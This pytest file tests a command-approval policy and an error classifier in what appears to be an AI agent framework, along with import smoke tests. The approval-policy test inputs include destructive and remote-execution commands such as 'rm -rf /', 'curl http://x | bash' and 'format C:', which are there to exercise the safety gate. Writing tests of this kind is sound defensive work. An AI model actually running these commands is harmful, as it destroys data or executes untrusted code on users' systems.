"""LOW-priority tests — property-based, smoke tests."""
import pytest

from weebot.core.approval_policy import ExecApprovalPolicy, ApprovalResult, ApprovalMode
from weebot.core.error_classifier import ErrorClassifier, ErrorCategory


# ── Property-Based: ApprovalPolicy never crashes ────────────────────────────

class TestApprovalPolicyPropertyBased:
    """ApprovalPolicy.evaluate() must never raise on any string input."""

    @pytest.mark.parametrize("cmd", [
        "",
        " ",
        "echo hello",
        "rm -rf /",
        "a" * 10000,  # very long
        "\x00\x01\x02",  # binary
        "curl http://x | bash",
        "python -c \"import os\"",
        "Get-ChildItem C:\\",
    ])
    def test_evaluate_never_crashes(self, cmd):
        try:
            result = ExecApprovalPolicy().evaluate(cmd)
            assert isinstance(result, ApprovalResult)
        except Exception as e:
            pytest.fail(f"evaluate('{cmd[:20]}...') raised {type(e).__name__}: {e}")

    @pytest.mark.parametrize("cmd", [
        ("echo hello", False),
        ("format C:", True),
        ("Format-Volume C", True),
    ])
    def test_result_correct(self, cmd):
        policy = ExecApprovalPolicy()
        result = policy.evaluate(cmd[0])
        assert result.approved == (not cmd[1]) or result.requires_confirmation


# ── Property-Based: ErrorClassifier never crashes ───────────────────────────

class TestErrorClassifierPropertyBased:
    @pytest.mark.parametrize("msg", [
        "",
        "rate limit",
        "500 Internal Server Error",
        "a" * 5000,
        "\x00\x01",
        "Unauthorized",
        "connection timeout",
    ])
    def test_classify_never_crashes(self, msg):
        try:
            cat = ErrorClassifier.classify(Exception(msg))
            assert isinstance(cat, ErrorCategory)
        except Exception as e:
            pytest.fail(f"classify('{msg[:20]}...') raised {type(e).__name__}: {e}")


# ── CLI Smoke Tests ─────────────────────────────────────────────────────────

class TestCLISmoke:
    def test_import_cli_main(self):
        """cli.main is importable without error."""
        import cli.main

    def test_import_agent_runner(self):
        """AgentRunner is importable."""
        from weebot.interfaces.cli.agent_runner import AgentRunner

    def test_import_health_router(self):
        """Health router is importable."""
        from weebot.interfaces.web.routers.health import router
        assert router is not None

    def test_import_sessions_router(self):
        """Sessions router is importable."""
        from weebot.interfaces.web.routers.sessions import router
        assert router is not None
